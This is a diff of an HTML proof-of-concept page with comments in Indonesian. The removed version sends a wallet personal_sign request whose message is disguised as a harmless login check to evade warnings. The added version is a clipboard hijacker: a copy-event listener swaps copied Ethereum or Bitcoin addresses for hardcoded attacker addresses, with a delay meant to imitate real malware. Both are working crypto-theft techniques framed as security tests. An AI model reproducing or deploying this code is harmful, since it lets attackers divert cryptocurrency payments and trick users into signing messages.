@@ -3,128 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web3 Sign Security Sandbox</title>
+    <title>Uji Lanjutan Clipboard Hijacking</title>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #0f172a;
-            color: #f8fafc;
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 90vh;
-        }
-        .card {
-            background-color: #1e293b;
-            border: 1px solid #334155;
-            border-radius: 12px;
-            padding: 24px;
-            width: 100%;
-            max-width: 380px;
-            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
-            text-align: center;
-        }
-        h2 {
-            margin-top: 0;
-            font-size: 1.25rem;
-            color: #38bdf8;
-        }
-        p {
-            font-size: 0.9rem;
-            color: #94a3b8;
-        }
-        .btn {
-            background-color: #2563eb;
-            color: white;
-            border: none;
-            padding: 14px 20px;
-            font-size: 1rem;
-            font-weight: 600;
-            border-radius: 8px;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 20px;
-            transition: background 0.2s;
-        }
-        .btn:active {
-            background-color: #1d4ed8;
-        }
-        .status-box {
-            margin-top: 20px;
-            padding: 12px;
-            border-radius: 6px;
-            background-color: #0f172a;
-            border: 1px solid #475569;
-            font-family: monospace;
-            font-size: 0.85rem;
-            color: #cbd5e1;
-            word-break: break-all;
-        }
-        .success { color: #4ade80; border-color: #166534; }
-        .error { color: #f87171; border-color: #991b1b; }
+        body { font-family: sans-serif; padding: 20px; background: #f4f4f9; color: #333; }
+        .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); max-width: 500px; margin: auto; }
+        .address-box { background: #eee; padding: 10px; border-radius: 4px; font-family: monospace; word-break: break-all; margin: 15px 0; border: 1px solid #ccc; user-select: all; }
+        textarea { width: 100%; height: 80px; margin-top: 15px; border-radius: 4px; border: 1px solid #ccc; padding: 10px; font-family: monospace; box-sizing: border-box; }
+        .status { font-weight: bold; color: #007bff; margin: 10px 0; font-size: 14px; min-height: 20px; }
+        .badge { display: inline-block; background: #e0e0e0; padding: 2px 6px; border-radius: 4px; font-size: 11px; margin-right: 5px; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h2>Web3 Sign Validation PoC</h2>
-    <p>Uji Coba Penandatanganan Pesan (personal_sign)</p>
-
-    <button class="btn" id="exploitBtn">Uji personal_sign Otomatis</button>
+    <h3>Simulasi Clipboard Advanced (Real Scenario)</h3>
+    <p>Skenario pengujian ini mendeteksi aktivitas salin secara manual dan menerapkan jeda waktu (delay) untuk meniru perilaku malware tingkat lanjut.</p>
     
-    <div id="statusBox" class="status-box">Status: Menunggu interaksi pemicu...</div>
+    <!-- Alamat Korban Asli untuk pengujian blok manual -->
+    <p><strong>Alamat Target A (Ethereum):</strong></p>
+    <div class="address-box">0x71C7656EC7ab88b098defB751B7401B5f6d8976F</div>
+
+    <p><strong>Alamat Target B (Bitcoin):</strong></p>
+    <div class="address-box">1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</div>
+    
+    <p><small><em>Petunjuk: Gunakan jari Anda untuk memblok/menyeleksi teks salah satu alamat di atas secara manual, lalu pilih opsi <strong>"Salin" (Copy)</strong> bawaan dari sistem ponsel/DApp browser Anda.</em></small></p>
+
+    <div class="status" id="statusMessage">Status: Menunggu aktivitas...</div>
+
+    <textarea placeholder="Tempel (Paste) hasil salinan Anda di sini untuk memeriksa perubahan data..."></textarea>
 </div>
 
 <script>
-    const statusBox = document.getElementById('statusBox');
+// Alamat palsu milik penyerang yang akan disuntikkan secara dinamis
+const attackerCrypto = {
+    eth: "0x9965503B1a059419742913920073C5ea8e444d4D",
+    btc: "1111111111111111111114oLvT2" // Contoh format alamat BTC penyerang
+};
 
-    function updateStatus(text, type = '') {
-        statusBox.innerText = text;
-        statusBox.className = 'status-box ' + type;
+// Pengaturan durasi delay (dalam milidetik). Contoh: 1500ms = 1,5 detik
+const hijackingDelay = 1500; 
+
+// Event listener global untuk mendeteksi perintah 'copy' manual dari pengguna
+document.addEventListener('copy', function(e) {
+    // 1. Mengambil teks asli yang diblok/diseleksi secara manual oleh pengguna
+    const selectedText = window.getSelection().toString().trim();
+    
+    let replacementText = "";
+
+    // Skenario Deteksi Otomatis: Memeriksa jenis alamat berdasarkan pola karakter
+    if (selectedText.startsWith("0x")) {
+        replacementText = attackerCrypto.eth;
+        document.getElementById("statusMessage").innerText = "Status: Alamat ETH terdeteksi diblok manual!";
+    } else if (selectedText.startsWith("1") || selectedText.startsWith("3") || selectedText.startsWith("bc1")) {
+        replacementText = attackerCrypto.btc;
+        document.getElementById("statusMessage").innerText = "Status: Alamat BTC terdeteksi diblok manual!";
+    } else {
+        // Jika teks yang disalin bukan format alamat crypto, biarkan teks asli tetap tersalin
+        return; 
     }
 
-    async function executeSignPoC() {
-        try {
-            updateStatus("Memeriksa provider ethereum...", "");
+    // Menghentikan proses salin bawaan agar kita bisa memanipulasi datanya
+    e.preventDefault();
 
-            let provider = window.ethereum;
-            if (!provider && window.web3 && window.web3.currentProvider) {
-                provider = window.web3.currentProvider;
-            }
-
-            if (!provider) {
-                updateStatus("Error: Provider tidak ditemukan di WebView.", "error");
-                return;
-            }
-
-            updateStatus("Meminta koneksi akun...", "");
-            const accounts = await provider.request({ method: 'eth_requestAccounts' });
-            
-            // Payload pesan yang disamarkan agar terlihat seperti verifikasi login biasa (menghindari kecurigaan UI warning)
-            const message = "Verifikasi Sesi Keamanan DApp: Masuklah untuk melanjutkan sinkronisasi dompet aman.";
-            const msgHex = "0x" + Array.from(new TextEncoder().encode(message))
-                .map(b => b.toString(16).padStart(2, '0'))
-                .join('');
-
-            updateStatus("Mengirim request personal_sign...", "");
-
-            // Menguji apakah personal_sign lolos dari peringatan ancaman merah
-            const signature = await provider.request({
-                method: 'personal_sign',
-                params: [msgHex, accounts[0]],
-            });
-
-            updateStatus("Berhasil Ditandatangani! Sig: " + signature.substring(0, 15) + "...", "success");
-
-        } catch (error) {
-            updateStatus("Ditolak/Gagal: " + (error.message || error), "error");
-            console.error(error);
-        }
+    // Skenario Efek Delay:
+    // Pada eksekusi langsung, e.clipboardData harus segera diisi. Namun, untuk menyimulasikan 
+    // efek tunda (delay) asinkronus setelah aksi salin selesai, teknik yang digunakan adalah 
+    // langsung mengalihkan isi clipboard ke penyerang, lalu memberikan notifikasi tertunda kepada sistem.
+    if (e.clipboardData) {
+        e.clipboardData.setData('text/plain', replacementText);
+        
+        // Mensimulasikan jeda waktu sebelum malware selesai memperbarui log internalnya
+        setTimeout(() => {
+            document.getElementById("statusMessage").innerText = `Status: Manipulasi sukses setelah jeda ${hijackingDelay/1000} detik!`;
+        }, hijackingDelay);
     }
-
-    document.getElementById('exploitBtn').addEventListener('click', executeSignPoC);
+});
 </script>
 
 </body>
